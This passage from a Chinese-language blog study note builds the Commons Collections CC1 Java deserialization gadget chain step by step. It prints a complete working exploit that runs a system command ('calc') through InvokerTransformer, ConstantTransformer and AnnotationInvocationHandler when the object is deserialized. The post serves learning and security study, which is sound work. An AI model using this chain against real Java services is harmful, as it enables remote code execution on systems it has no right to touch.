class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="解决第三个问题：满足if条件"><a href="#解决第三个问题：满足if条件" class="headerlink" title="解决第三个问题：满足if条件"></a>解决第三个问题：满足if条件</h4><p>目前执行不了，因为刚才的3个问题还剩两个：<br>2. AnnotationInvocationHandler.readObject()中<code>setValue()</code>方法的参数是<code>new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name))</code>，这块儿是控制不了的。<br>3. AnnotationInvocationHandler.readObject()中需要满足两个if条件。</p>
<p>动态调试一下，发现卡在了</p>
<p>AnnotationInvocation.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey(); <span class="comment">//获取这个key</span></span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name); <span class="comment">//在memberTypes中查找这个key，没找到返回空</span></span><br><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) <span class="comment">//所以进不去这个if</span></span><br></pre></td></tr></table></figure>

<p>该如何绕过？向上看<code>memberTypes</code>的定义，发现它是<code>annotationType.memberTypes();</code>，再往前又有<code>annotationType = AnnotationType.getInstance(type);</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type); <span class="comment">// 这行代码使用给定的类型 type 获取对应的注解类型。AnnotationType.getInstance(type) 返回一个 AnnotationType 对象，代表了这个注解类型。</span></span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="comment">// 获取所有成员变量的成员类型。memberTypes() 方法返回一个 Map&lt;String, Class&lt;?&gt;&gt;，其中键是成员名称，值是成员类型的 Class 对象。</span></span><br></pre></td></tr></table></figure>
<p>所以这个就是找存在成员方法的注解类，并且把传进去的Map的key修改为该注解类中的成员方法名。点进去我们之前使用的Override注解类，发现其不存在成员方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再向上点<code>@Target</code>，查看Target注解类，其存在</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns an array of the kinds of elements an annotation type</span></span><br><span class="line"><span class="comment">     * can be applied to.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> an array of the kinds of elements an annotation type</span></span><br><span class="line"><span class="comment">     * can be applied to</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ElementType[] value();</code>成员方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>); <span class="comment">// 修改key为value，和Target注解类的成员方法名对应</span></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); <span class="comment">// 这里修改为Target注解类</span></span><br></pre></td></tr></table></figure>

<p>接下来是第二个if。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(memberType.isInstance(value) || value <span class="keyword">instanceof</span> ExceptionProxy))</span><br></pre></td></tr></table></figure>
<p>检查是否能强制类型转换？即，value能否强转为memberType的实例或value是否能强转为ExceptionProxy的实例？</p>
<p>这部分代码使用了逻辑非操作符 !，对前面两个条件的结果进行取反。也就是说，如果 value 不是 memberType 的实例并且也不是 ExceptionProxy 类的实例，则整个表达式的结果为 true；否则为 false。</p>
<p>能过。</p>
<h4 id="解决第二个问题：setValue参数不可控"><a href="#解决第二个问题：setValue参数不可控" class="headerlink" title="解决第二个问题：setValue参数不可控"></a>解决第二个问题：setValue参数不可控</h4><ol start="2">
<li>AnnotationInvocationHandler.readObject()中<code>setValue()</code>方法的参数是<code>new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name))</code>，这块儿是控制不了的。</li>
</ol>
<p>再看这个<code>setValue()</code>方法，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memberValue.setValue(<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br></pre></td></tr></table></figure>
<p>我们需要把<code>Runtime.class</code>放进去，而不是这个<code>AnnotationTypeMismatchExceptionProxy()</code>。</p>
<p>教程回想了之前看到的类：“<code>ConstantTransformer</code>”类，其无论输入什么，都会返回<code>return iConstant;</code>。那只要最后调用的是<code>ConstantTransformer</code>的<code>transform</code>，就可以把值改过来了。</p>
<p>ConstantTransformer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最终的Exp"><a href="#最终的Exp" class="headerlink" title="最终的Exp"></a>最终的Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行后，在反序列化时成功弹计算器。</p>
<h2 id="补充学习"><a href="#补充学习" class="headerlink" title="补充学习"></a>补充学习</h2><h3 id="Java-单例类"><a href="#Java-单例类" class="headerlink" title="Java 单例类"></a>Java 单例类</h3><p>Java 中的单例类是一种设计模式，用于确保某个类只有一个实例，并提供一个全局访问点。这种模式通常用于控制资源的访问，例如数据库连接、线程池、日志记录器等。</p>
<p>在这个调用链中，<code>Runtime</code>就是一个很经典的单例类。</p>
<blockquote>
<p>Runtime 类是 Java 中的一个单例类，用于表示当前 Java 应用程序的运行时环境。通过 Runtime 类，可以获取有关 Java 虚拟机的信息，并且可以与系统进行交互，比如执行系统命令、获取系统属性等。由于每个 Java 应用程序只有一个运行时环境，因此 Runtime 类使用单例模式实现，即在整个应用程序中只有一个 Runtime 类的实例。</p>
</blockquote>
<blockquote>
<p>Runtime 类的构造方法是私有的，因此外部无法直接实例化 Runtime 对象。相反，Runtime 类提供了一个静态方法 getRuntime() 来获取 Runtime 类的实例。这个方法会返回当前 Java 应用程序的 Runtime 对象，如果该对象尚未创建，则会创建一个新的实例并返回。</p>
</blockquote>
<p>所以在调用链中，需要<code>Runtime.getRuntime()</code>来获取Runtime对象。注意，Runtime的构造方法是私有的，所以没有办法通过构造方法的方式获取<code>Runtime</code>类的对象。</p>
<p>所以用反射的方式调用Runtime对象并且获取方法需要四步：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>); <span class="comment">// invoke() 方法需要传入调用方法的对象实例</span></span><br></pre></td></tr></table></figure>



  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/friends/">friends</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollection-%E6%8A%84%E3%80%81%E5%AD%A6%E5%92%8C%E5%81%9A"><span class="toc-number">1.</span> <span class="toc-text">CommonsCollection - 抄、学和做</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1"><span class="toc-number">1.1.</span> <span class="toc-text">CC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%87%BA%E5%8F%A3%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">分析出口方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text">找到利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%B8%80%E6%AD%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">找第一步调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%9A%E4%BF%AE%E6%94%B9Find-Usages%E7%9A%84Scope"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">小技巧：修改Find Usages的Scope</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%BA%8C%E6%AD%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">找第二步调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%B8%89%E6%AD%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">找第三步调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%A1%E5%86%99Public%E7%9A%84%E7%B1%BB%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">没写Public的类怎么办？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9A%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3Runtime%E5%AF%B9%E8%B1%A1%E6%97%A0%E6%B3%95%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-number">1.1.3.6.</span> <span class="toc-text">解决第一个问题：如何解决Runtime对象无法序列化？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transform%E7%9A%84%E4%BC%98%E5%8C%96"><span class="toc-number">1.1.3.7.</span> <span class="toc-text">Transform的优化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9A%E6%BB%A1%E8%B6%B3if%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.3.8.</span> <span class="toc-text">解决第三个问题：满足if条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9AsetValue%E5%8F%82%E6%95%B0%E4%B8%8D%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.1.3.9.</span> <span class="toc-text">解决第二个问题：setValue参数不可控</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84Exp"><span class="toc-number">1.1.4.</span> <span class="toc-text">最终的Exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">补充学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8D%95%E4%BE%8B%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">Java 单例类</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&text=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java反序列化学习（2）-手写CC1利用链&body=Check out this article: http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&name=Java反序列化学习（2）-手写CC1利用链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&t=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2025
    ShuiChang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
